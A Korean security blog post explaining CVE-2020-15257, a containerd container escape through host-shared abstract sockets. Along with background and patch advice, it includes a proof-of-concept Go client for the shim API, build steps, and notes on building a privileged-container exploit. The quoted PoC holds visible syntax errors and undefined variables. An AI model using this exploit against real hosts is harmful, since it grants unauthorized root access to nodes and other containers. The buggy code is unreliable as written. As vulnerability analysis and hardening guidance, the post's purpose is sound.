---
layout: post
title: "CVE-2020-15257 컨테이너 이스케이프 취약점"
author: Moon Hyun Jong (heizelnet)
date: 2021-01-08 17:00:00
categories: Docker
img: 1.png
---

해당 취약점은 2020년 11월 30일 CSS Group에 의해 발견된 Docker & Kubernetes 컨테이너 이스케이프 취약점입니다. 호스트와 컨테이너의 namespace를 공유하는 설정에서 발생하였으며, Escape 이후 Root 권한으로 다른 **컨테이너** 혹은 **호스트 (노드)**에 영향을 미칠 수 있습니다.

이 글에서는 다음과 같은 내용을 소개하고자 합니다.

* 배경 지식
* 취약점 발생 원인 및 대상
* POC
* 익스플로잇 접근 방향
* 취약점 예상 연계
* 취약점 패치 현황 및 추천 패치방향

<br />

## 배경 지식

#### 컨테이너

리눅스는 커널에서 지원하는 **namespace** 기능을 통해 파일 시스템, 프로세스, 네트워크, 사용자 등을 분리할 수 있습니다. 이를 통해 유저와 파일 시스템이 분리된 환경을 **컨테이너**라 부릅니다.

#### 도커의 구성 요소

도커는 클라이언트인 Docker CLI와 서버인 Docker daemon으로 구성됩니다. 서버인 Docker daemon은 컨테이너 인스턴스 실행 및 관리 등의 기능을 담당하며 다음과 같은 모듈들로 구성됩니다.

```
* containerd
* containerd-shim
* runC
```

<div class="img-in-post">
<img src="/images/1/Docker Daemon Component.png" />
[그림 1] Docker Daemon Component
</div>

#### 컨테이너 런타임과 Containerd의 역할

컨테이너 런타임은 저수준과 고수준 컨테이너 런타임으로 나뉩니다. **저수준 컨테이너 런타임**은 namespace와 cgroup을 설정하고 명령을 실행하는 역할을 수행하며, **고수준 컨테이너 런타임**은 이를 제어할 수 있는 API를 제공합니다. containerd는 고수준 컨테이너 런타임에 해당하며, 컨테이너 구성설정인 config.json파일을 생성하는 역할과  containerd-shim과 runc를 사용하여 container를 생성하는 역할을 수행합니다. 

#### Containerd의 통신방식의 이해

Docker daemon은 **/run/containerd/containerd.sock** 소켓파일을 통해 gRPC 기반 REST API를 호출하여 containerd에 명령을 내립니다. containerd는 **@/containerd-shim/moby/[container ID].sock@** 추상 소켓을 통해 containerd-shim과 gRPC 기반에서 통신합니다. 해당 추상 소켓은 새로운 container가 생성될 때 매칭되는 containerd-shim 프로세스가 실행되면서 생성됩니다.

<div class="img-in-post">
<img src="/images/1/image-20210104143103255.png" />
[그림 2] Containerd-shim process check
</div>

#### 컨테이너 이스케이프

**호스트**에서 컨테이너를 실행할 때 --privileged 옵션을 적용하거나 이스케이프 취약점이 존재하는 버전의 도커를 사용할 경우, 컨테이너에서 호스트의 파일시스템에 **root 권한**으로 접근할 수 있는 문제점 등이 발생할 수 있습니다. 이러한 취약점을 컨테이너 이스케이프(Container Escape) 라 부릅니다.

<br />

## 취약점 발생 원인 및 대상

#### 소켓 접근 (Socket Access)

**추상 소켓**은 일반적인 소켓과 달리 파일의 경로가 NULL문자 (\0)로 시작하며, 일반적인 파일시스템의 파일 디스크립터 대신 /proc/net/unix 파일을 통해 접근할 수 있습니다. Docker 실행 시 **--net=host** 옵션 부여 혹은 Kubernetes pod 실행 시 **.spec.hostNetwork: true** 옵션을 부여할 경우 호스트와 컨테이너가 **network namespace**를 공유하며 [그림3] 과 같이 컨테이너 내부에서  호스트의 /proc/net/unix에 접근할 수 있음을 알 수 있습니다. 

<div class="img-in-post">
<img src="/images/1/proc_net_unix.png" />
[그림 3] Container access abstract socket
</div>

접근 가능한 추상 소켓을 통해 아래와 같은 컨테이너 조작이 가능한 API를 사용할 수 있습니다.

```proto
// https://github.com/containerd/containerd/blob/v1.3.7/runtime/v1/shim/v1/shim.proto

service Shim {
	// State returns shim and task state information.
	rpc State(StateRequest) returns (StateResponse);

	rpc Create(CreateTaskRequest) returns (CreateTaskResponse);

	rpc Start(StartRequest) returns (StartResponse);

	rpc Delete(google.protobuf.Empty) returns (DeleteResponse);

	rpc DeleteProcess(DeleteProcessRequest) returns (DeleteResponse);

	rpc ListPids(ListPidsRequest) returns (ListPidsResponse);

	rpc Pause(google.protobuf.Empty) returns (google.protobuf.Empty);

	rpc Resume(google.protobuf.Empty) returns (google.protobuf.Empty);

	rpc Checkpoint(CheckpointTaskRequest) returns (google.protobuf.Empty);

	rpc Kill(KillRequest) returns (google.protobuf.Empty);

	rpc Exec(ExecProcessRequest) returns (google.protobuf.Empty);

	rpc ResizePty(ResizePtyRequest) returns (google.protobuf.Empty);

	rpc CloseIO(CloseIORequest) returns (google.protobuf.Empty);

	// ShimInfo returns information about the shim.
	rpc ShimInfo(google.protobuf.Empty) returns (ShimInfoResponse);

	rpc Update(UpdateTaskRequest) returns (google.protobuf.Empty);

	rpc Wait(WaitRequest) returns (WaitResponse);
}
```

#### 잘못된 권한 체크 (Wrong Permission Check)

해당 소켓을 사용할 경우, Containerd에서는 다음과 같은 코드를 통해 권한을 체크합니다.

```go
/* 	  		   
  UnixSocketRequireSameUser resolves the current effective unix user 
  This is useful when using abstract sockets that are accessible by all users.
*/
func UnixSocketRequireSameUser() UnixCredentialsFunc {
	euid, egid := os.Geteuid(), os.Getegid()
	return UnixSocketRequireUidGid(euid, egid)
}

func requireRoot(ucred *unix.Ucred) error {
	return requireUidGid(ucred, 0, 0)
}

func requireUidGid(ucred *unix.Ucred, uid, gid int) error {
	if (uid != -1 && uint32(uid) != ucred.Uid) || (gid != -1 && uint32(gid) != ucred.Gid) {
		return errors.Wrap(syscall.EPERM, "ttrpc: invalid credentials")
	}
	return nil
}

func requireUnixSocket(conn net.Conn) (*net.UnixConn, error) {
	uc, ok := conn.(*net.UnixConn)
	if !ok {
		return nil, errors.New("a unix socket connection is required")
	}

	return uc, nil
}
```
<div class="link-url">
<a href="https://github.com/containerd/containerd/blob/v1.3.7/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80" target="_blank">https://github.com/containerd/containerd/blob/v1.3.7/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80</a>
</div>

UnixSocketRequireSameUser 함수는 euid, guid가 0인지 체크하는데, 컨테이너에서 실행되는 프로세스 또한 일반적으로 **root 유저 권한**으로 실행됩니다. 이러한 잘못된 권한 체크는 --net=host 옵션과 함께 **container escape** 취약점 유발요소로 작용합니다.

#### 취약점 적용 대상 (Target Version)

해당 취약점은 아래의 대상에 취약합니다.

```
Target : Containerd
Version : < v1.4.3, < 1.3.9, < v1.2.12
```

취약한 대상 확인 방법은 아래와 같습니다.

```bash
$ sudo containerd --version
```

<br />

## POC

POC는 아래의 코드와 같습니다.

```go
package main

import (
	"context"
	"errors"
	"io/ioutil"
	"log"
	"net"
	"regexp"
	"strings"
	"os/exec"
    "fmt"
	"github.com/containerd/ttrpc"
	"github.com/gogo/protobuf/types"
)

func exp(sock string) bool {
	sock = strings.Replace(sock, "@", "", -1)
	conn, err := net.Dial("unix", "\x00"+sock)
	if err != nil {
		log.Println(err)
		return false
	}

	client := ttrpc.NewClient(conn)
	shimClient := NewShimClient(client)
	ctx := context.Background()
    out, err := exec.Command("cat" "/proc/self/cgroup").Output()
    re.err := re.FindAllString(string(out), 1)
    log.Println("Container ID:", string(matches[0]))
    
    info2, err := shimClient.State(ctx, &StateRequest{
        ID: string(matches[0]),
    })
    if(err != nil) {
        log.Println("Error State:", err)
    }
    log.Println("Container State:", info2)
	return true
}

func getShimSockets() ([][]byte, error) {
	re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
	if err != nil {
		return nil, err
	}
	data, err := ioutil.ReadFile("/proc/net/unix")
	matches := re.FindAll(data, -1)
	if matches == nil {
		return nil, errors.New("Cannot find vulnerable socket")
	}
	return matches, nil
}

func main() {
	matchset := make(map[string]bool)
	socks, err := getShimSockets()
	if err != nil {
		log.Fatalln(err)
	}
	for _, b := range socks {
		sockname := string(b)
		if _, ok := matchset[sockname]; ok {
			continue
		}
		log.Println("try socket:", sockname)
		matchset[sockname] = true
		if exp(sockname) {
			break
		}
	}

	return
}
```
<div class="link-url">
<a href="https://github.com/summershrimp/exploits-open/blob/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257/main.go" target="_blank">https://github.com/summershrimp/exploits-open/blob/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257/main.go</a>
</div>

해당 코드는 추상 소켓에 접근하여 Client 생성 이후 지원하는 Shim API 중 State 함수를 이용하여 대상 컨테이너의 State를 확인하는 코드입니다.

#### 빌드 및 실행 방법 

POC 빌드 및 실행방법은 아래와 같습니다. 

```bash
$ mkdir CVE-2020-15257 & cd CVE-2020-15257
$ vi main.go                                               // Paste POC here
$ go get github.com/containerd/ttrpc
$ go get -v github.com/containerd/containerd
$ wget https://raw.githubusercontent.com/summershrimp/exploits-open/main/CVE-2020-15257/shim.pb.go
$ go build .
$ sudo docker cp CVE-2020-15257 [your_container_id]:/tmp    // Copy to container & exec 
```

(* 실행되는 컨테이너는 실행가능한 Containerd 버전 및 --net=host 옵션을 적용해야 합니다.)

<br />

## 익스플로잇 접근 방향

상단의 POC코드에서 Create 함수를 추가하여 Privileged Container를 생성하는 방식 등을 통해 컨테이너 이스케이프 및 익스플로잇을 진행할 수 있습니다. 

<div class="img-in-post">
<img src="/images/1/exploit.png" />
[그림 4] Exploit map
</div>

함수 실행을 위해서 파라미터로 **CreateTaskRequest** 구조체를 작성해야하며, 구조체는 다음과 같습니다.

```go
message CreateTaskRequest {
	string id = 1;
	string bundle = 2;
	string runtime = 3;
	repeated containerd.types.Mount rootfs = 4;
	bool terminal = 5;
	string stdin = 6;
	string stdout = 7;
	string stderr = 8;
	string checkpoint = 9;
	string parent_checkpoint = 10;
	google.protobuf.Any options = 11;
}
```

이 중에서 함수 호출에 필요한 **필수 구조체 멤버** 작성 예시는 다음과 같습니다.

```
var M = CreateTaskRequest {
	ID: RANDOM_10_STRING,
	Bundle: CONFIG_FILE_HOST_PATH,
	Terminal: true,
	Stdin: "/dev/null",
	Stdout: "/dev/null",
	Stderr: "/dev/null",
}
```

익스플로잇 작성에 추가적으로 필요한 요소와 확인할 수 있는 명령어는 아래를 참조하면 도움이 됩니다.

```bash
Container ID : #cat /proc/self/cgroup
Container Mount Host path : #head -1 /etc/mtab
```

익스플로잇 실행 화면과 성공하였을 때 예제 화면은 아래와 같습니다.

<div class="img-in-post">
<img src="/images/1/15257_exp_container.png" />
[그림 5] Exploit in Container
</div>

<div class="img-in-post">
<img src="/images/1/15257_exp_host.png" />
[그림 6] Access to Host
</div>

<br />

## 취약점 예상 연계

해당 취약점을 이용하여 아래의 공격에 활용 가능합니다.

```
1. 해당 노드 내 새로운 컨테이너 생성 혹은 Reverse Shell 생성
2. 노드 내 다른 컨테이너 접근
3. 노드 내 민감한 정보 유출
4. CVE-2020-8559 취약점과 연계하여 kubelet 변조 이후 마스터 노드 접근 (In kubernetes)
```

<br />

## 취약점 패치 현황 및 추천 패치방향

해당 취약점은 아래의 버전에서 패치되었습니다.  **--net=host** 옵션 혹은 **.spec.hostNetwork: true** 옵션을 사용하는 환경의 경우 버전 업데이트를 추천드립니다.

```
v1.2.12 / v1.3.9 / v1.4.3
```

버전 업데이트를 진행하기 힘든 경우 **--user** 옵션, **.spec.[]containers.securityContext** 옵션을 통해 non root user 를 명시하여 실행하거나 SELinux 환경에서 실행하시는걸 추천드립니다.

```bash
$ docker run --net=host --user 12345 --security-opt no-new-privileges
```

```
hostNetwork: true
containers:
- name: foo
  securityContext:
    runAsUser: 12345
    allowPrivilegeEscalation: false
```

<br />

## Conclusion

실무에서 --net=host 옵션의 경우 자주 사용되는 옵션은 아닙니다. 하지만 네트워크 인터페이스 공유 등을 목적으로 예제를 검색할 때 non root user 옵션이 누락된 경우를 종종 볼 수 있습니다. 호스트와 자원이나 권한을 공유하는 이러한 옵션들은 보안 옵션을 꼭 병행하여 사용하시는 것을 추천드립니다.

<br />

## Reference
* [https://medium.com/nttlabs/dont-use-host-network-namespace-f548aeeef575](https://medium.com/nttlabs/dont-use-host-network-namespace-f548aeeef575)
* [https://ssup2.github.io/theory_analysis/Docker_Component/](https://ssup2.github.io/theory_analysis/Docker_Component/)
* [https://github.com/summershrimp/exploits-open/tree/main/CVE-2020-15257](https://github.com/summershrimp/exploits-open/tree/main/CVE-2020-15257)
* [https://www.cdxy.me/?p=837](https://www.cdxy.me/?p=837)
